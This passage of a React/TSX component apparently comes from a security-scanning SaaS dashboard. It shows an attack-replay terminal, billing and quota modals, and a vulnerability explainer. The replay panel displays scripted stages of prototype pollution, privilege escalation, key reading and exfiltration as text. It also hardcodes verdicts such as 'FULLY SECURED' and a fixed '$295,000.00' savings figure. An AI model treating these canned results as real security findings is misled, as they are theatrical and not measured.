                          <span className="text-red-400 font-bold">EXPLOIT SHIELDED</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Mitigation Type:</span>
                          <span className="text-green-400 font-bold">Virtual Hotpatch</span>
                        </div>
                        <div className="flex justify-between">
                          <span>Sandbox Lock Status:</span>
                          <span className="text-green-400 font-bold">FULLY SECURED</span>
                        </div>
                        <div className="flex justify-between">
                          <span>SLA Liability Saved:</span>
                          <span className="text-yellow-400 font-bold">$295,000.00</span>
                        </div>
                      </div>
                    </div>

                    <p className="text-[10px] text-gray-500 font-mono italic max-w-xs leading-relaxed">
                      "Zero latency container isolation defused the privilege escalation string before variables exfiltration was successfully synchronized."
                    </p>

                    <div className="w-full pt-4 border-t border-white/5 text-[9px] text-gray-600 font-mono flex justify-between shrink-0">
                      <span>VERDICT: IMMUNE</span>
                      <span>NODE ID: SECURE-09</span>
                    </div>
                  </motion.div>
                ) : (
                  /* STANDARD TERMINAL FEED */
                  <div className="flex flex-col h-full justify-between">
                    {/* Top terminal bar */}
                    <div className="flex items-center justify-between pb-3 border-b border-white/10 shrink-0">
                      <div className="flex items-center gap-2">
                        <Terminal className="w-3.5 h-3.5 text-red-500 animate-pulse" />
                        <span className="text-[10px] font-bold text-gray-400 uppercase tracking-widest">Isolated Sandbox tty1</span>
                      </div>
                      <span className="text-[9px] font-black text-green-400 border border-green-500/20 bg-green-500/5 px-2 py-0.5 rounded-full uppercase">
                        SECURED NODE
                      </span>
                    </div>

                    {/* Terminal stdout logs */}
                    <div className="flex-1 py-4 space-y-4 overflow-y-auto font-mono text-[10px] text-gray-400 select-all pr-1">
                      <div>
                        <p className="text-red-400">$ {REPLAY_STAGES[replayCurrentStage].command}</p>
                        <p className="text-gray-500 mt-1">Executing exploit simulation script in secure sandbox context...</p>
                      </div>

                      <div className="border border-white/5 bg-white/[0.01] p-3 rounded-xl space-y-2">
                        {replayCurrentStage >= 0 && (
                          <div>
                            <p className="text-green-400 font-bold">[!] STAGE 1: IDENTIFIED</p>
                            <p className="text-gray-500">Lodash-es signature payload mismatch. CVE-2020-8203 propagation score: 9.8 (CRITICAL).</p>
                          </div>
                        )}

                        {replayCurrentStage >= 1 && (
                          <div className="pt-2 border-t border-white/[0.04]">
                            <p className="text-green-400 font-bold">[!] STAGE 2: INJECTION</p>
                            <p className="text-gray-500">Injecting payload prototype polluted string into sandbox namespace target...</p>
                            <p className="text-yellow-400 font-bold mt-1">SUCCESS: Object.prototype.polluted = true</p>
                          </div>
                        )}

                        {replayCurrentStage >= 2 && (
                          <div className="pt-2 border-t border-white/[0.04]">
                            <p className="text-red-400 font-bold">[!] STAGE 3: ESCALATION</p>
                            <p className="text-gray-500">Executing privilege elevation binary './runtime_elevation'...</p>
                            <p className="text-red-500 font-bold mt-1">CRITICAL: ROOT TERMINAL ELEVATION ACHIEVED</p>
                          </div>
                        )}

                        {replayCurrentStage >= 3 && (
                          <div className="pt-2 border-t border-white/[0.04]">
                            <p className="text-orange-400 font-bold">[!] STAGE 4: RUNTIME EXPOSURE</p>
                            <p className="text-gray-500">Reading environmental runtime keys and Firestore authorization hashes...</p>
                            <p className="text-yellow-400 mt-1 font-mono">FIREBASE_API_KEY: AIzaSyD9u...[REDACTED]</p>
                          </div>
                        )}

                        {replayCurrentStage >= 4 && (
                          <div className="pt-2 border-t border-white/[0.04]">
                            <p className="text-red-400 font-bold">[!] STAGE 5: DATA EXFILTRATION</p>
                            <p className="text-gray-500">Attempting payload exfiltration stream to external address...</p>
                            <p className="text-red-500 animate-pulse mt-1 font-bold">WARNING: OUTBOUND EGRESS TARGET DETECTED PORT 8443</p>
                          </div>
                        )}
                      </div>
                    </div>

                    {/* Bottom terminal controls explanation */}
                    <div className="pt-3 border-t border-white/10 text-[9px] text-gray-500 shrink-0 font-mono flex items-center justify-between">
                      <span>SECTOR: OZONE-SANDBOX</span>
                      <span>BAUD: 115200</span>
                    </div>
                  </div>
                )}
              </div>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Saved Report Deletion Confirmation Modal */}
      <AnimatePresence>
        {reportToDelete && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/80 backdrop-blur-md"
          >
            <motion.div
              initial={{ scale: 0.95, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-md bg-[#090d16] border border-red-500/30 rounded-2xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(239,68,68,0.15)]"
            >
              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-500 via-orange-500 to-red-500" />

              <div className="flex items-center gap-3 text-red-400 mb-4">
                <div className="w-10 h-10 rounded-xl bg-red-500/10 border border-red-500/20 flex items-center justify-center shrink-0">
                  <AlertTriangle className="w-5 h-5 text-red-500" />
                </div>
                <div>
                  <h4 className="font-bold text-white uppercase font-mono tracking-wider">Delete Intelligence Report?</h4>
                  <p className="text-[10px] text-gray-500 font-mono">Registry: {reportToDelete.type === "saved" ? "savedReports" : "scans"}</p>
                </div>
              </div>

              <p className="text-xs text-gray-400 font-mono leading-relaxed mb-6">
                Are you sure you want to permanently delete <code className="text-red-400 bg-red-500/5 border border-red-500/10 px-1.5 py-0.5 rounded font-mono text-[10px]">{reportToDelete.repoName}</code>? This action cannot be reverted and will remove the runtime intelligence records.
              </p>

              <div className="flex items-center justify-end gap-3">
                <button
                  onClick={() => setReportToDelete(null)}
                  disabled={isDeletingReport}
                  className="px-4 py-2 text-xs font-mono text-gray-400 hover:text-white bg-white/5 border border-white/10 rounded-xl transition-all"
                >
                  Cancel
                </button>
                <button
                  onClick={handleDeleteReport}
                  disabled={isDeletingReport}
                  className="flex items-center gap-1.5 px-4 py-2 text-xs font-bold font-mono text-black bg-red-500 hover:bg-red-400 rounded-xl transition-all shadow-[0_0_15px_rgba(239,68,68,0.3)] disabled:opacity-50"
                >
                  {isDeletingReport ? <Loader2 className="w-3.5 h-3.5 animate-spin" /> : <Trash2 className="w-3.5 h-3.5" />}
                  Delete Permanently
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Credit Exhaustion Management Modal */}
      <AnimatePresence>
        {showExhaustionModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/90 backdrop-blur-lg"
          >
            <motion.div
              initial={{ scale: 0.95, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-lg bg-[#0b0f19] border border-red-500/30 rounded-2xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(239,68,68,0.2)]"
            >
              {/* Pulse glow background */}
              <div className="absolute top-0 left-1/4 w-1/2 h-20 bg-red-500/10 blur-2xl rounded-full" />
              <div className="absolute -top-10 -right-10 w-32 h-32 bg-red-500/5 blur-3xl rounded-full pointer-events-none" />

              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-red-600 via-orange-500 to-red-600 animate-pulse" />

              <div className="flex flex-col items-center justify-center text-center py-4 mb-6">
                <div className="w-14 h-14 rounded-2xl bg-red-500/10 border border-red-500/20 flex items-center justify-center mb-4 shadow-[0_0_20px_rgba(239,68,68,0.2)]">
                  <Zap className="w-8 h-8 text-red-500 animate-bounce" />
                </div>
                <h3 className="text-xl font-black text-white uppercase tracking-wider font-mono">Runtime Credits Exhausted</h3>
                <p className="text-xs text-gray-500 font-mono mt-1">SaaS Quota Enforcement Node · Security Sandbox Locked</p>
              </div>

              <p className="text-xs text-gray-400 font-mono text-center leading-relaxed mb-6 max-w-sm mx-auto">
                Your available AI credits have run out. Threat scanning and attack replay simulations are locked until replenishment is processed. Still allows browsing, report viewing, and admin access.
              </p>

              <div className="space-y-2.5">
                <button
                  onClick={() => {
                    setShowExhaustionModal(false);
                    setShowControlCenter(true);
                    setTimeout(() => setShowRequestCreditsModal(true), 250);
                  }}
                  className="w-full flex items-center justify-between p-3.5 bg-yellow-500 hover:bg-yellow-400 text-black font-black uppercase text-xs rounded-xl transition-all shadow-[0_0_15px_rgba(234,179,8,0.2)]"
                >
                  <span className="flex items-center gap-2 font-mono"><Key className="w-4 h-4 text-black" /> Request More Credits</span>
                  <span className="text-[9px] font-mono opacity-80">FREE ALLOCATION</span>
                </button>

                <button
                  onClick={() => {
                    setShowExhaustionModal(false);
                    setShowControlCenter(true);
                  }}
                  className="w-full flex items-center justify-between p-3.5 bg-white/5 hover:bg-white/10 text-white border border-white/10 rounded-xl transition-all"
                >
                  <span className="flex items-center gap-2 font-mono"><Layers className="w-4 h-4 text-blue-400" /> Redeem Runtime Code</span>
                  <span className="text-[9px] font-mono text-gray-500">APPLY ACCESS KEY</span>
                </button>

                <button
                  onClick={handleUpgradeToEnterprise}
                  className="w-full flex items-center justify-between p-3.5 bg-purple-600 hover:bg-purple-500 text-white font-bold uppercase text-xs rounded-xl transition-all shadow-[0_0_15px_rgba(147,51,234,0.2)]"
                >
                  <span className="flex items-center gap-2 font-mono"><Shield className="w-4 h-4 text-purple-300" /> Upgrade to Enterprise</span>
                  <span className="text-[9px] font-mono text-purple-300">+1000 CR INSTANT</span>
                </button>
              </div>

              <div className="flex justify-center mt-6">
                <button
                  onClick={() => setShowExhaustionModal(false)}
                  className="text-[10px] font-bold uppercase tracking-wider text-gray-500 hover:text-gray-300 transition-colors"
                >
                  Dismiss & Browse Sandbox
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Premium Runtime Governance Modal */}
      <AnimatePresence>
        {showGovernanceModal && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/90 backdrop-blur-lg"
          >
            <motion.div
              initial={{ scale: 0.95, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-lg bg-[#0b0f19] border border-yellow-500/30 rounded-2xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(234,179,8,0.2)]"
            >
              {/* Pulse glow background */}
              <div className="absolute top-0 left-1/4 w-1/2 h-20 bg-yellow-500/10 blur-2xl rounded-full" />
              <div className="absolute -top-10 -right-10 w-32 h-32 bg-yellow-500/5 blur-3xl rounded-full pointer-events-none" />

              <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-yellow-600 via-amber-500 to-yellow-600 animate-pulse" />

              <div className="flex flex-col items-center justify-center text-center py-4 mb-6">
                <div className="w-14 h-14 rounded-2xl bg-yellow-500/10 border border-yellow-500/20 flex items-center justify-center mb-4 shadow-[0_0_20px_rgba(234,179,8,0.2)]">
                  <ShieldAlert className="w-8 h-8 text-yellow-500 animate-pulse" />
                </div>
                <h3 className="text-xl font-black text-white uppercase tracking-wider font-mono">Demo Limit Reached</h3>
                <p className="text-xs text-gray-500 font-mono mt-1">SaaS Quota Enforcement Node · Security Sandbox Locked</p>
              </div>

              <div className="space-y-4 max-w-sm mx-auto text-center font-mono mb-6">
                <p className="text-xs text-gray-400 leading-relaxed">
                  Your trial scan quota has been exhausted. Newly created FREE accounts are allocated a maximum of <span className="text-yellow-400 font-bold">2 demo scans</span> per cycle to prevent runtime resource abuse.
                </p>
                <div className="bg-yellow-500/5 border border-yellow-500/20 rounded-xl px-4 py-2.5 text-[11px] text-yellow-300 inline-block">
                  ⚡ Quota Resets in <span className="font-black text-yellow-400">31 Days</span> from registration date
                </div>
              </div>

              <div className="space-y-2.5">
                <button
                  onClick={() => {
                    setShowGovernanceModal(false);
                    setShowControlCenter(true);
                    setTimeout(() => setShowRequestCreditsModal(true), 250);
                  }}
                  className="w-full flex items-center justify-between p-3.5 bg-yellow-500 hover:bg-yellow-400 text-black font-black uppercase text-xs rounded-xl transition-all shadow-[0_0_15px_rgba(234,179,8,0.2)]"
                >
                  <span className="flex items-center gap-2 font-mono"><Key className="w-4 h-4 text-black" /> Request Additional Credits</span>
                  <span className="text-[9px] font-mono opacity-80">FREE EXTENSION</span>
                </button>

                <button
                  onClick={() => {
                    setShowGovernanceModal(false);
                    setShowControlCenter(true);
                  }}
                  className="w-full flex items-center justify-between p-3.5 bg-white/5 hover:bg-white/10 text-white border border-white/10 rounded-xl transition-all"
                >
                  <span className="flex items-center gap-2 font-mono"><Layers className="w-4 h-4 text-blue-400" /> Redeem Access Code</span>
                  <span className="text-[9px] font-mono text-gray-500">APPLY CODE</span>
                </button>

                <button
                  onClick={handleUpgradeToEnterprise}
                  className="w-full flex items-center justify-between p-3.5 bg-purple-600 hover:bg-purple-500 text-white font-bold uppercase text-xs rounded-xl transition-all shadow-[0_0_15px_rgba(147,51,234,0.2)]"
                >
                  <span className="flex items-center gap-2 font-mono"><Shield className="w-4 h-4 text-purple-300" /> Upgrade to Enterprise</span>
                  <span className="text-[9px] font-mono text-purple-300">UNLIMITED ACCESS</span>
                </button>
              </div>

              <div className="flex justify-center mt-6">
                <button
                  onClick={() => setShowGovernanceModal(false)}
                  className="text-[10px] font-bold uppercase tracking-wider text-gray-500 hover:text-gray-300 transition-colors"
                >
                  Dismiss & Browse Sandbox
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* AI Vulnerability Explainer Modal */}
      <AnimatePresence>
        {explainVuln && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-black/85 backdrop-blur-md"
          >
            {/* Click-out backdrop */}
            <div className="absolute inset-0" onClick={() => setExplainVuln(null)} />

            <motion.div
              initial={{ scale: 0.95, y: 20 }}
              animate={{ scale: 1, y: 0 }}
              exit={{ scale: 0.95, y: 20 }}
              className="w-full max-w-2xl bg-[#080b11]/95 border border-cyan-500/20 rounded-2xl p-6 relative overflow-hidden shadow-[0_0_50px_rgba(34,211,238,0.15)] flex flex-col max-h-[85vh] z-10"
            >
              {/* Top premium border glow */}
              <div className="absolute top-0 left-0 w-full h-[2px] bg-gradient-to-r from-cyan-500 via-blue-500 to-purple-600" />

              {/* Header */}
              <div className="flex items-start justify-between border-b border-white/5 pb-4 mb-4 shrink-0">
                <div className="space-y-1">
                  <div className="flex items-center gap-2">
                    <Bot className="w-5 h-5 text-cyan-400" />
                    <span className="text-xs font-mono font-bold tracking-widest text-cyan-400 uppercase">AI Threat Intel Engine</span>
                  </div>
                  <h3 className="text-xl font-bold tracking-tight text-white font-mono flex items-center gap-2">
                    {explainVuln.id} <span className="text-xs text-gray-500 font-sans font-normal">in {explainVuln.packageName}</span>
                  </h3>
                </div>
                <button
                  onClick={() => setExplainVuln(null)}
                  className="text-gray-400 hover:text-white p-1 rounded-full hover:bg-white/5 transition-colors"
                >
                  <X className="w-5 h-5" />
                </button>
              </div>

              {explainLoading ? (
                /* Animated loading state */
                <div className="flex-1 flex flex-col items-center justify-center py-20 space-y-4">
                  <Loader2 className="w-10 h-10 text-cyan-400 animate-spin" />
                  <p className="text-xs font-mono text-cyan-400 animate-pulse uppercase tracking-wider">Syncing Neural Exploit Mappings...</p>
                </div>
              ) : (() => {
                const info = getAIExplanation(explainVuln);

                let severityBadgeColor = "text-blue-400 border-blue-500/30 bg-blue-500/10";
                if (explainVuln.severity.toUpperCase() === "CRITICAL") severityBadgeColor = "text-red-400 border-red-500/30 bg-red-500/10 shadow-[0_0_10px_rgba(239,68,68,0.2)]";
                else if (explainVuln.severity.toUpperCase() === "HIGH") severityBadgeColor = "text-orange-400 border-orange-500/30 bg-orange-500/10 shadow-[0_0_10px_rgba(249,115,22,0.2)]";
                else if (explainVuln.severity.toUpperCase() === "MEDIUM" || explainVuln.severity.toUpperCase() === "MODERATE") severityBadgeColor = "text-yellow-400 border-yellow-500/30 bg-yellow-500/10";

                return (
                  <div className="flex-1 overflow-y-auto space-y-6 pr-2 custom-scrollbar">

                    {/* Top Row: Severity & Threat Score */}
                    <div className="grid grid-cols-2 gap-4">

                      {/* Severity Panel */}
                      <div className="bg-white/[0.02] border border-white/5 rounded-xl p-5 flex flex-col justify-center">
                        <span className="text-xs text-gray-300 font-mono uppercase tracking-wider mb-1.5 font-semibold">Impact Level</span>
                        <div className="flex items-center gap-2">
                          <span className={`text-sm font-bold font-mono px-3 py-1 rounded border uppercase ${severityBadgeColor}`}>
                            {explainVuln.severity}
                          </span>
                          {explainVuln.aliases && explainVuln.aliases !== "No CVE ID" && (
                            <span className="text-sm font-mono text-gray-300 bg-white/5 border border-white/10 px-2.5 py-1 rounded">
                              {explainVuln.aliases}
                            </span>
                          )}
                        </div>
                      </div>

                      {/* Threat Score Panel */}
                      <div className="bg-white/[0.02] border border-white/5 rounded-xl p-5 flex items-center justify-between">
                        <div className="flex flex-col">
                          <span className="text-xs text-gray-300 font-mono uppercase tracking-wider mb-0.5 font-semibold">AI Threat Score</span>
                          <span className="text-3xl font-extrabold font-mono text-cyan-400">{info.score} <span className="text-xs text-gray-400 font-sans font-normal">/ 100</span></span>
                        </div>

                        {/* Interactive radial-like indicator */}
                        <div className="w-12 h-12 rounded-full border-2 border-white/10 flex items-center justify-center relative overflow-hidden shrink-0">
                          <div className={`absolute inset-0 opacity-20 ${info.score >= 80 ? 'bg-red-500' : 'bg-yellow-500'}`} />
                          <ShieldAlert className={`w-6 h-6 ${info.score >= 80 ? 'text-red-400' : 'text-yellow-400'}`} />
                        </div>
                      </div>

                    </div>

                    {/* Terminal-style Narration */}
                    <div className="bg-black/60 border border-white/5 rounded-xl p-5 relative overflow-hidden">
                      <div className="absolute top-3 right-3 flex gap-1">
                        <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-pulse" />
                        <span className="w-1.5 h-1.5 rounded-full bg-cyan-500" />
                        <span className="w-1.5 h-1.5 rounded-full bg-blue-500" />
                      </div>
                      <div className="text-xs text-cyan-300 font-mono mb-2.5 uppercase tracking-widest flex items-center gap-1.5 font-bold">
                        <Terminal className="w-4 h-4 text-cyan-400" /> AI Analyst Narration
                      </div>
                      <p className="text-sm font-mono text-gray-200 leading-relaxed font-medium">
                        {info.summary}
                      </p>
                    </div>

                    {/* Exploit Mechanism */}
                    <div className="space-y-2">
                      <h4 className="text-sm font-extrabold text-cyan-400/90 uppercase tracking-wider font-mono">Exploit Mechanism</h4>
                      <p className="text-sm text-gray-200 leading-relaxed font-medium bg-white/[0.03] border border-white/5 p-4 rounded-xl">
                        {info.mechanism}
                      </p>
                    </div>

                    {/* Attack Flow mini-visualization */}
                    <div className="space-y-2">
                      <h4 className="text-sm font-extrabold text-cyan-400/90 uppercase tracking-wider font-mono">Potential Attack Propagation Chain</h4>
                      <div className="bg-black/40 border border-white/5 p-5 rounded-xl relative overflow-hidden">

                        {/* Dynamic decorative network grids */}
                        <div className="absolute inset-0 opacity-[0.03] bg-[linear-gradient(to_right,#808080_1px,transparent_1px),linear-gradient(to_bottom,#808080_1px,transparent_1px)] bg-[size:14px_24px]" />

                        <div className="relative flex flex-col md:flex-row items-stretch md:items-center justify-between gap-4">

                          <div className="bg-white/5 border border-white/10 px-4 py-2.5 rounded-lg text-center shrink-0">
                            <span className="text-xs text-gray-300 font-mono uppercase block font-bold mb-1">Ingress</span>
                            <span className="text-sm font-black text-white">Public Request</span>
                          </div>

                          <div className="flex items-center justify-center shrink-0">
                            <span className="text-sm text-cyan-400 animate-pulse font-mono font-bold">➔</span>
                          </div>

                          <div className="bg-white/5 border border-cyan-500/20 px-4 py-2.5 rounded-lg text-center border-dashed shrink-0">
                            <span className="text-xs text-cyan-300 font-mono uppercase block font-bold mb-1">Trigger Point</span>
                            <span className="text-sm font-black text-cyan-300 font-mono">{explainVuln.packageName}</span>
                          </div>

                          <div className="flex items-center justify-center shrink-0">
                            <span className="text-sm text-cyan-400 animate-pulse font-mono font-bold">➔</span>
                          </div>

                          <div className="bg-red-500/10 border border-red-500/30 px-4 py-2.5 rounded-lg text-center shrink-0">
                            <span className="text-xs text-red-300 font-mono uppercase block font-bold mb-1">Consequence</span>
                            <span className="text-sm font-black text-red-400 font-mono">Remote Exploit</span>
                          </div>

                        </div>

                        <div className="text-xs text-gray-300 font-mono mt-4 text-center tracking-normal font-semibold">
                          {info.attackPath}
                        </div>
                      </div>
                    </div>

                    {/* Impact vs Remediation */}
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">

                      {/* Business Impact */}
                      <div className="bg-white/[0.02] border border-white/5 rounded-xl p-4">
                        <h4 className="text-sm font-extrabold text-cyan-400/90 uppercase tracking-wider font-mono mb-2">Business Impact</h4>
                        <p className="text-sm text-gray-200 leading-relaxed font-medium bg-white/[0.01] border border-white/5 p-3 rounded-lg">
                          {info.impact}
                        </p>
                      </div>

                      {/* Recommended Remediation */}
                      <div className="bg-white/[0.02] border border-white/5 rounded-xl p-4">
                        <h4 className="text-sm font-extrabold text-cyan-400/90 uppercase tracking-wider font-mono mb-2">Recommended Mitigation</h4>
                        <p className="text-sm text-gray-200 leading-relaxed font-medium bg-white/[0.01] border border-white/5 p-3 rounded-lg">
                          {info.remediation}
                        </p>
                      </div>

                    </div>

                    {/* Footer Warning */}
                    <div className="pt-4 border-t border-white/5 flex items-center justify-between text-gray-400 font-mono text-xs uppercase font-bold tracking-wider">
                      <span>Neural Signature verified: V2.1</span>
                      <span>Mitigation Status: PENDING PATCH</span>
                    </div>

                  </div>
                );
              })()}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

function StatCard({ label, value, color }: { label: string, value: number, color: string }) {
  return (
    <div className="glass-card p-5 md:p-6 rounded-2xl border border-white/5 flex flex-col justify-center items-center text-center hover:bg-white/10 transition-colors shadow-lg">
      <p className="text-gray-400 text-xs font-semibold mb-2 uppercase tracking-wider">{label}</p>
      <span className={`text-3xl md:text-4xl font-bold font-mono tracking-tighter ${color}`}>{value}</span>
    </div>
  );
}
